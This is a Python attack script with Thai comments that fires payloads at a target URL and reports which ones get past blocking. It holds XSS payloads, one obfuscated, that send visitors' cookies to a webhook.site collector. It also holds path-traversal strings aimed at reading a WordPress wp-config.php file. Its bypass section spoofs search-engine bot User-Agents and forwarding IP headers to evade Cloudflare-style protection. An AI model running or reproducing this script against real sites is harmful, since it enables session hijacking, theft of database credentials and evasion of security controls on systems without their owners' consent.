#!/usr/bin/env python3
"""
Specific Payload Tester - ทดสอบ payload เฉพาะที่ใช้ในการทดสอบ
"""

import requests
import urllib.parse
import time
import json
from typing import List, Dict, Any

class SpecificPayloadTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
    
    def test_original_payloads(self) -> List[Dict[str, Any]]:
        """ทดสอบ payload เดิมที่คุณใช้"""
        print("[+] ทดสอบ payload เดิมที่คุณใช้...")
        
        # Payloads จากข้อมูลที่คุณให้มา
        original_payloads = [
            # XSS Cookie Stealing (URL encoded)
            "%3Cscript%3Evar%20c%3DString.fromCharCode(99,111,111,107,105,101);var%20d%3DString.fromCharCode(100,111,99,117,109,101,110,116);var%20l%3DString.fromCharCode(108,111,99,97,116,105,111,110);var%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bwindow%5Bd%5D%5Bl%5D%20%3D%20a%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(window%5Bd%5D%5Bc%5D)%3B%3C%2Fscript%3E",
            
            # Path Traversal - Original attempts
            "../../../../../../wp-config.php",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwp-config.php",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwp-config.php",
            "%2e%2e%2f%2e%2e%2f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwp-config.php",
            
            # Alternative XSS Cookie Stealing
            "%3Cscript%3Evar%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bdocument.location%3Da%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(document.cookie)%3B%3C%2Fscript%3E",
        ]
        
        results = []
        test_endpoints = [
            "/search?q=",
            "/index.php?page=",
            "/file?path=",
            "/download?file=",
            "/view?doc=",
        ]
        
        for payload in original_payloads:
            print(f"  [-] ทดสอบ payload: {payload[:50]}...")
            
            for endpoint in test_endpoints:
                try:
                    test_url = f"{self.target_url}{endpoint}{payload}"
                    response = self.session.get(test_url, timeout=15)
                    
                    result = {
                        'payload': payload,
                        'endpoint': endpoint,
                        'url': test_url,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'is_blocked': self._is_blocked(response),
                        'response_preview': response.text[:300] + '...' if len(response.text) > 300 else response.text,
                        'headers': dict(response.headers)
                    }
                    results.append(result)
                    
                    if not result['is_blocked'] and response.status_code == 200:
                        print(f"    [+] สำเร็จ! {test_url}")
                        print(f"        Status: {response.status_code}, Length: {len(response.text)}")
                    
                    time.sleep(1)  # Delay to avoid rate limiting
                    
                except Exception as e:
                    print(f"    [-] Error: {e}")
                    results.append({
                        'payload': payload,
                        'endpoint': endpoint,
                        'url': test_url,
                        'error': str(e)
                    })
        
        return results
    
    def test_improved_payloads(self) -> List[Dict[str, Any]]:
        """ทดสอบ payload ที่ปรับปรุงแล้ว"""
        print("[+] ทดสอบ payload ที่ปรับปรุงแล้ว...")
        
        improved_payloads = [
            # Path Traversal - More variations
            "....//....//....//....//....//....//wp-config.php",
            "..%252f..%252f..%252f..%252f..%252f..%252fwp-config.php",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwp-config.php",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fwp-config.php",
            "..\\..\\..\\..\\..\\..\\wp-config.php",
            "..//..//..//..//..//..//wp-config.php",
            
            # XSS - Improved versions
            "<script>var a='https://webhook.site/128fa6c2-fe85-4a6c-b522-0346f6aae885';document.location=a + '/?c=' + encodeURIComponent(document.cookie);</script>",
            "<img src=x onerror=\"var a='https://webhook.site/128fa6c2-fe85-4a6c-b522-0346f6aae885';document.location=a + '/?c=' + encodeURIComponent(document.cookie);\">",
            "<svg onload=\"var a='https://webhook.site/128fa6c2-fe85-4a6c-b522-0346f6aae885';document.location=a + '/?c=' + encodeURIComponent(document.cookie);\">",
            
            # URL encoded versions
            "%3Cscript%3Evar%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bdocument.location%3Da%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(document.cookie)%3B%3C%2Fscript%3E",
            "%3Cimg%20src%3Dx%20onerror%3D%22var%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bdocument.location%3Da%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(document.cookie)%3B%22%3E",
        ]
        
        results = []
        test_endpoints = [
            "/search?q=",
            "/index.php?page=",
            "/comment?text=",
            "/user?name=",
            "/file?path=",
        ]
        
        for payload in improved_payloads:
            print(f"  [-] ทดสอบ improved payload: {payload[:50]}...")
            
            for endpoint in test_endpoints:
                try:
                    test_url = f"{self.target_url}{endpoint}{payload}"
                    response = self.session.get(test_url, timeout=15)
                    
                    result = {
                        'payload': payload,
                        'endpoint': endpoint,
                        'url': test_url,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'is_blocked': self._is_blocked(response),
                        'response_preview': response.text[:300] + '...' if len(response.text) > 300 else response.text,
                        'headers': dict(response.headers)
                    }
                    results.append(result)
                    
                    if not result['is_blocked'] and response.status_code == 200:
                        print(f"    [+] สำเร็จ! {test_url}")
                        print(f"        Status: {response.status_code}, Length: {len(response.text)}")
                    
                    time.sleep(1)
                    
                except Exception as e:
                    print(f"    [-] Error: {e}")
                    results.append({
                        'payload': payload,
                        'endpoint': endpoint,
                        'url': test_url,
                        'error': str(e)
                    })
        
        return results
    
    def test_bypass_techniques(self) -> List[Dict[str, Any]]:
        """ทดสอบเทคนิคการ bypass เฉพาะ"""
        print("[+] ทดสอบเทคนิคการ bypass เฉพาะ...")
        
        bypass_techniques = [
            # Bot User-Agents
            {
                'name': 'Google Bot',
                'headers': {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
            },
            {
                'name': 'Bing Bot',
                'headers': {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'}
            },
            {
                'name': 'Baidu Bot',
                'headers': {'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'}
            },
            
            # IP Spoofing
            {
                'name': 'Local IP',
                'headers': {'X-Forwarded-For': '127.0.0.1'}
            },
            {
                'name': 'Cloudflare IP',
                'headers': {'CF-Connecting-IP': '127.0.0.1'}
            },
            
            # Combined techniques
            {
                'name': 'Bot + Local IP',
                'headers': {
                    'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                    'X-Forwarded-For': '127.0.0.1'
                }
            },
        ]
        
        test_payloads = [
            "../../../../../../wp-config.php",
            "%3Cscript%3Evar%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bdocument.location%3Da%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(document.cookie)%3B%3C%2Fscript%3E",
        ]
        
        results = []
        
        for technique in bypass_techniques:
            print(f"  [-] ทดสอบ technique: {technique['name']}")
            
            for payload in test_payloads:
                try:
                    # สร้าง session ใหม่สำหรับแต่ละเทคนิค
                    test_session = requests.Session()
                    test_session.headers.update(technique['headers'])
                    
                    test_url = f"{self.target_url}/index.php?page={payload}"
                    response = test_session.get(test_url, timeout=15)
                    
                    result = {
                        'technique': technique['name'],
                        'payload': payload,
                        'url': test_url,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'is_blocked': self._is_blocked(response),
                        'response_preview': response.text[:300] + '...' if len(response.text) > 300 else response.text,
                        'headers_used': technique['headers']
                    }
                    results.append(result)
                    
                    if not result['is_blocked'] and response.status_code == 200:
                        print(f"    [+] สำเร็จ! {test_url}")
                        print(f"        Technique: {technique['name']}")
                        print(f"        Status: {response.status_code}, Length: {len(response.text)}")
                    
                    time.sleep(2)  # Longer delay for bypass attempts
                    
                except Exception as e:
                    print(f"    [-] Error: {e}")
                    results.append({
                        'technique': technique['name'],
                        'payload': payload,
                        'url': test_url,
                        'error': str(e),
                        'headers_used': technique['headers']
                    })
        
        return results
    
    def _is_blocked(self, response) -> bool:
        """ตรวจสอบว่าถูกบล็อกหรือไม่"""
        blocked_indicators = [
            'cloudflare',
            '403 forbidden',
            'attention required',
            'sorry, you have been blocked',
            'unable to access',
            'security service',
            'online attacks'
        ]
        
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in blocked_indicators)
    
    def run_comprehensive_test(self) -> Dict[str, Any]:
        """รันการทดสอบแบบครอบคลุม"""
        print(f"[+] เริ่มการทดสอบ payload เฉพาะสำหรับ: {self.target_url}")
        print("=" * 60)
        
        results = {
            'target_url': self.target_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'original_payloads': self.test_original_payloads(),
            'improved_payloads': self.test_improved_payloads(),
            'bypass_techniques': self.test_bypass_techniques()
        }
        
        # สรุปผลลัพธ์
        print("\n" + "=" * 60)
        print("สรุปผลการทดสอบ:")
        
        successful_original = sum(1 for r in results['original_payloads'] if not r.get('is_blocked', True) and r.get('status_code') == 200)
        successful_improved = sum(1 for r in results['improved_payloads'] if not r.get('is_blocked', True) and r.get('status_code') == 200)
        successful_bypass = sum(1 for r in results['bypass_techniques'] if not r.get('is_blocked', True) and r.get('status_code') == 200)
        
        print(f"Original payloads: {successful_original} successful")
        print(f"Improved payloads: {successful_improved} successful")
        print(f"Bypass techniques: {successful_bypass} successful")
        
        if successful_original > 0 or successful_improved > 0 or successful_bypass > 0:
            print("\n[+] Payload ที่สำเร็จ:")
            for category, tests in results.items():
                if category in ['original_payloads', 'improved_payloads', 'bypass_techniques']:
                    for r in tests:
                        if not r.get('is_blocked', True) and r.get('status_code') == 200:
                            print(f"  - {category}: {r.get('url', 'N/A')}")
        
        return results
    
    def save_results(self, results: Dict[str, Any], filename: str = None):
        """บันทึกผลลัพธ์เป็นไฟล์ JSON"""
        if filename is None:
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            filename = f"specific_payload_test_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] บันทึกผลลัพธ์ลงไฟล์: {filename}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Specific Payload Tester')
    parser.add_argument('url', help='URL เป้าหมาย')
    parser.add_argument('-o', '--output', help='ไฟล์ output (JSON)')
    
    args = parser.parse_args()
    
    tester = SpecificPayloadTester(args.url)
    results = tester.run_comprehensive_test()
    tester.save_results(results, args.output)

if __name__ == "__main__":
    main()